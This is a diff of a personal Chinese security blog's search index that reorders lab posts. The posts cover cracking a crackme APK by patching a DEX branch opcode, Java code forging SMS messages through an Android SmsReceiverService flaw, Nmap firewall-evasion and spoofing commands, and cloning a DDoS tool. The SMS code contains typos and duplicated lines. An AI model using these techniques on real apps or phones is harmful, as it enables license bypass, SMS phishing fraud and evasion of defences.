@@ -1,6 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>APK静态分析</title>
+    <url>/blog/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
+<ul>
+<li>了解APK（DEX）静态分析的基本步骤</li>
+<li>掌握使用IDApro辅助进行静态分析的方法</li>
+</ul>
+<p>原理：</p>
+<ul>
+<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
+<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
+</ul>
+<p>过程：</p>
+<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
+<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
+<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
+<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
+<p>打开crackeme0502，点击“获取注解”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
+<p>打开crackme0502，点击“检测注册码”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
+<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
+<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
+<p>MainActivity$1.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
+<p>MainActivity$2.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
+<p>按空格键将IDA切换至“流程视图”<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
+<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
+<p>然后切换至HEX-view 1选项卡<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
+<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
+<p>ctrl+f寻找,将38改为39</p>
+<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
+<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
+<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
+<p><img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
+]]></content>
+      <tags>
+        <tag>APK</tag>
+        <tag>逆向</tag>
+        <tag>IDA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP加壳</title>
     <url>/blog/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</url>
     <content><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p>
@@ -45,87 +85,6 @@
       </tags>
   </entry>
   <entry>
-    <title>APK静态分析</title>
-    <url>/blog/2021/12/28/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="APK静态分析"><a href="#APK静态分析" class="headerlink" title="APK静态分析"></a>APK静态分析</h2><p>目的：</p>
-<ul>
-<li>了解APK（DEX）静态分析的基本步骤</li>
-<li>掌握使用IDApro辅助进行静态分析的方法</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>程序静态分析（Program Static Analysis）是指在不运行代码的方式下，通过词法分析、语法分析、控制流、数据流分析等技术对程序代码进行扫描，验证代码是否满足规范性、安全性、可靠性、可维护性等指标的一种代码分析技术。目前静态分析技术向模拟执行的技术发展以能够发现更多传统意义上动态测试才能发现的缺陷，例如符号执行、抽象解释、值依赖分析等等并采用数学约束求解工具进行路径约减或者可达性分析以减少误报增加效率。</li>
-<li>Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。</li>
-</ul>
-<p>过程：</p>
-<p>使用解压软件打开crackme0502.apk,解压出classes.dex，打开IDApro并将classes.dex拖入到IDA中<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105021723.png" alt="image-20211229105021723"></p>
-<p>导入结构化文件，点击file-script file，然后选择dex.idc文件，确定<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105052129.png" alt="image-20211229105052129"></p>
-<p>按ALT+Q，可以看到DEX文件的结构，选择某一项点击确定，可以跳到相应字段的起始位置<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105232030.png" alt="image-20211229105232030"></p>
-<p>打开eclipse，启动SimpleEdu45虚拟机，并在SimpleEdu45目录下运行命令adb install crackme0502.apk<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105658041.png" alt="image-20211229105658041"></p>
-<p>打开crackeme0502，点击“获取注解”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105844377.png" alt="image-20211229105844377"></p>
-<p>打开crackme0502，点击“检测注册码”按钮<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229105858622.png" alt="image-20211229105858622"></p>
-<p>切换回IDA pro，切换至Exports选项卡。程序运行的主Activity一般叫MainActivity，所以按住ctrl+f，键入Main，可以发现MainActivity中有两个内部类都有OnClick()方法。<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110001643.png" alt="image-20211229110001643"></p>
-<p>分别双击MainActivity$1.onClick@VL和MainActivity$2.onClick@VL来查看对应的方法实现，通过对比，可以发现后者的方法创建了名为SNChecker的一个对象，故序列号检查功能应该在MainActivity$​2.onClick@VL中。</p>
-<p>MainActivity$1.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110055781.png" alt="image-20211229110055781"></p>
-<p>MainActivity$2.onClick@VL <img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110114049.png" alt="image-20211229110114049"></p>
-<p>按空格键将IDA切换至“流程视图”<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110629336.png" alt="image-20211229110629336"></p>
-<p>很明显可以看出，红色的线是不满足条件所跳转到的语句，绿色的是满足条件时的跳转。所以把if-eqz换成if-nez就有可能破解成功。故将光标定位值if-eqz一行<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110655907.png" alt="image-20211229110655907"></p>
-<p>然后切换至HEX-view 1选项卡<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229110748059.png" alt="image-20211229110748059"></p>
-<p>关闭IDA，右键使用UltraEdit工具打开classes.dex，按CTRL+F搜索38020F00（有多个38020F00，注意起始地址是否为002D0B0，如下图所示）。由于if-nez的Opcode为39，故将38改为39，然后保存该文件（点击右上角切为16进制显示模式）<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111128616.png" alt="image-20211229111128616"></p>
-<p>ctrl+f寻找,将38改为39</p>
-<p>运行DexFixer.exe，将保存好的DEX文件拖进窗口中，进行Header的Checksum修复<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111244001.png" alt="image-20211229111244001"></p>
-<p>把classes.dex重新添加至apk文件（使用360压缩打开apk文件将class.dex替换即可），并运行命令signapk crackme0502.apk重新签名<img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111424498.png" alt="image-20211229111424498"></p>
-<p>并把生成的signed.apk按着之前的方法重新安装至虚拟机中（需要先将之前安装的程序卸载）adb install signed.apk。注意是signed.apk。再次点击下面的按钮，发现软件提示已注册。</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/APK%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/image-20211229111717277.png" alt="image-20211229111717277"></p>
-]]></content>
-      <tags>
-        <tag>APK</tag>
-        <tag>逆向</tag>
-        <tag>IDA</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Android安全之短信欺诈漏洞</title>
-    <url>/blog/2021/12/27/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>目的：</p>
-<ul>
-<li>通过JAVA编程理解Android手机安全漏洞的基本原理</li>
-<li>用JAVA编写伪造短信代码，向系统收件箱发送伪造短信</li>
-</ul>
-<p>原理：</p>
-<ul>
-<li>漏洞原理介绍</li>
-<li>该系统漏洞能够使攻击者无需申请任何权限发送短信到用户收件箱。 出现该漏洞的原因是Android系统的com.android.mms.transaction。</li>
-<li>SmsReceiverService系统服务未判断启动服务的调用者，攻击者可以通过该应用发送伪装短信到用户收件箱。本漏洞实质上是一种能力的泄漏。</li>
-<li>漏洞发送的短信并不经过GSM网络,所以即使手机没有插sim卡,也照样可以收到短信,这让大部分的短信防火墙完全失效。</li>
-</ul>
-<p>过程：</p>
-<p>打开eclipse，点击file-import，选择android目录下的existing android code into workspace<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100046569.png" alt="image-20211229100046569"></p>
-<p>选择simpleedu28项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100118574.png" alt="image-20211229100118574"></p>
-<p>导入后的项目<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100200697.png" alt="image-20211229100200697"></p>
-<p>在工程目录res/layout的界面代码，这里可以通过控制代码，编辑相应的函数生成欺诈短信，点击activity_main.xml，可以看到界面布局的文件<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100257165.png" alt="image-20211229100257165"></p>
-<p>在mainactivity中添加运行欺诈短信的代码，点开<code>msgdemo2\src\com.example.msgdemol\mainactivity.java</code><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229100406295.png" alt="image-20211229100406295"></p>
-<p>在mainactivity的init()函数添加如下代码，为button设置监听事件</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为发送按钮设置监听</span></span><br><span class="line">sendBt.setOnClickListener(<span class="keyword">new</span> OnClickListener()&#123;</span><br><span class="line">       <span class="meta">@Override</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                       <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 *获取输入的伪造号码和内</span></span><br><span class="line"><span class="comment">                 *判断输入是否合法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">String num=msgNumTv.getText().toString();</span><br><span class="line">String con=msgConTv.getText().toString();</span><br><span class="line">If(num.length()&lt;<span class="number">1</span>||con.length()&lt;<span class="number">1</span>)</span><br><span class="line">&#123; Toast.makeText(MainActivity.<span class="keyword">this</span>,”电话号码或者内容没有输入”,Toast.LENGTH_SHORT).show();</span><br><span class="line"><span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="comment">//判断通过伪造短信</span></span><br><span class="line"><span class="comment">//make Msg(MainActivity.this,num,con);</span></span><br><span class="line">createFakeMsg(MainActivity.<span class="keyword">this</span>,num,con);&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>在MainActivity的init()函数,跳转到init函数位置添加上一步的代码</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229101856123.png" alt="image-20211229101856123">createFakeMsg的具体代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p>
-<p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p>
-<p>右键MSGDEMO2，选择run as-android application按钮<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p>
-<p>虚拟端返回运行后结果<img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p>
-<p>点击发送，手机接收欺诈短信</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>
-]]></content>
-      <tags>
-        <tag>Android</tag>
-        <tag>短信</tag>
-        <tag>欺诈</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DDos攻击</title>
     <url>/blog/2021/11/24/DDos%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h2 id="DDos攻击"><a href="#DDos攻击" class="headerlink" title="DDos攻击"></a>DDos攻击</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ha3MrX/DDOs-Attack   # 下载工具</span><br><span class="line">vim ddos-attack.py</span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/python2</span></span><br><span class="line">chmod +777 ddos-attack.py #直接使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -135,6 +94,28 @@
         <tag>ddos</tag>
         <tag>python</tag>
         <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nmap简单使用</title>
+    <url>/blog/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
+
+<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -174,28 +155,6 @@
 ]]></content>
       <tags>
         <tag>-fckeditor -webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Nmap简单使用</title>
-    <url>/blog/2021/11/24/Nmap%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="Nmap简单使用"><a href="#Nmap简单使用" class="headerlink" title="Nmap简单使用"></a>Nmap简单使用</h2><h3 id="躲避防火墙，分组发送报文"><a href="#躲避防火墙，分组发送报文" class="headerlink" title="躲避防火墙，分组发送报文"></a>躲避防火墙，分组发送报文</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -f -v 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="设定最大传输单元，必须是8的倍数"><a href="#设定最大传输单元，必须是8的倍数" class="headerlink" title="设定最大传输单元，必须是8的倍数"></a>设定最大传输单元，必须是8的倍数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --mtu 16 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="指定多个诱饵"><a href="#指定多个诱饵" class="headerlink" title="指定多个诱饵"></a>指定多个诱饵</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -D 192.168.61.130 ME 127.0.0.1  #(ME 后面接目标地址)</span><br></pre></td></tr></table></figure>
-
-<h3 id="源地址欺骗"><a href="#源地址欺骗" class="headerlink" title="源地址欺骗"></a>源地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sI www.baidu.com:80 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="源端口欺骗"><a href="#源端口欺骗" class="headerlink" title="源端口欺骗"></a>源端口欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --source-port 88 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="根据发包长度（tcp是40字节，icmp溢出是28字节）"><a href="#根据发包长度（tcp是40字节，icmp溢出是28字节）" class="headerlink" title="根据发包长度（tcp是40字节，icmp溢出是28字节）"></a>根据发包长度（tcp是40字节，icmp溢出是28字节）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --data-length 30 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<h3 id="MAC地址欺骗"><a href="#MAC地址欺骗" class="headerlink" title="MAC地址欺骗"></a>MAC地址欺骗</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT -PN --spoof-mac 0 127.0.0.1</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>nmap</tag>
       </tags>
   </entry>
   <entry>
@@ -324,31 +283,6 @@
       </tags>
   </entry>
   <entry>
-    <title>centos7安装apache</title>
-    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
-    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>
-
